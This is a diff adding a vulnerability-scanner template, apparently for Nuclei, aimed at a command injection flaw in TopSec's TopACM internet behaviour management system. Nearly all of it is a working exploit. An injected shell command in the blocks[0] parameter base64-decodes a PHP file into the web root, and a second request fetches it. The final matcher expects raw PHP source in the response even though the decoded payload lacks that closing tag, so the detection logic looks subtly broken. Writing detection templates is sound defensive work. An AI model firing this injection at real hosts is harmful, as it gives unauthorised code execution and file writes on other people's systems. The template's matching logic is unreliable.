@@ -1,0 +1,47 @@
+id: topsec-topacm-rce
+info:
+  name: TopSec TopACM Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is an arbitrary command execution vulnerability in the TopSec Internet
+    behavior management system. Attackers can execute arbitrary commands on the
+    system, write files, obtain webshell, and read sensitive information.
+  reference:
+    - https://www.topsec.com.cn/product/27.html
+    - https://mp.weixin.qq.com/s/5UMEIrDiG5hQFofByYH78g
+  tags: command-execution
+  classification:
+    cvss-score: 9.8
+
+variables:
+  cmd: "echo PD9waHAgcGhwaW5mbygpOw== | base64 -d > /var/www/html/poc.php"
+
+http:
+  - raw:
+      - |
+        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|%20{{cmd}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ip -6 neigh del"
+
+  - raw:
+      - |
+        GET /poc.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<?php phpinfo(); ?>"
